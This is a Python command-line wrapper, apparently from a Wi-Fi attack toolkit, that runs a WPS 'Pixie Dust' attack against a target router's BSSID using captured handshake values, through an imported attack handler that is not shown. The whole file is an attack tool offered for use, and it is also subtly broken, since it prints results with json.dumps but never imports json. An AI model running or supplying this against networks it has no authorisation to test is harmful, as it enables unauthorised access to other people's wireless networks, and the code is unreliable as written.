#!/usr/bin/env python3
"""
Simple CLI wrapper to run the comprehensive WPS attack flow using
pixiewps_integration.WPSAttackHandler.

Usage examples:
  python3 wps_attack.py 98:03:8E:81:C1:F6 -i wlan0mon -e MySSID -c 6
"""

import argparse
import sys
from pixiewps_integration import WPSAttackHandler


def main():
    parser = argparse.ArgumentParser(description='Enhanced WPS attack wrapper')
    parser.add_argument('bssid', help='Target BSSID (AA:BB:CC:DD:EE:FF)')
    parser.add_argument('-i', '--interface', default='wlan0mon')
    parser.add_argument('-e', '--essid', default='Target')
    parser.add_argument('-c', '--channel', type=int, default=6)
    parser.add_argument('--pke', help='PKE hex')
    parser.add_argument('--pkr', help='PKR hex')
    parser.add_argument('--eh1', help='E-Hash1 hex')
    parser.add_argument('--eh2', help='E-Hash2 hex')
    parser.add_argument('--authkey', help='AuthKey hex')
    parser.add_argument('--enonce', help='E-Nonce hex')
    parser.add_argument('--quiet', action='store_true')
    parser.add_argument('--auto-clone', action='store_true', help='Attempt to clone pixiewps-extend into vendor/')
    args = parser.parse_args()

    if len(args.bssid) != 17 or args.bssid.count(':') != 5:
        print('[-] Invalid BSSID format')
        sys.exit(1)

    handler = WPSAttackHandler(interface=args.interface, verbose=not args.quiet)

    res = handler.comprehensive_attack(
        bssid=args.bssid,
        essid=args.essid,
        pke=args.pke,
        pkr=args.pkr,
        e_hash1=args.eh1,
        e_hash2=args.eh2,
        authkey=args.authkey,
        e_nonce=args.enonce,
        channel=args.channel,
        auto_clone_pixie=args.auto_clone,
    )

    print('\n=== ATTACK RESULTS ===')
    print(json.dumps(res, indent=2))

if __name__ == '__main__':
    main()
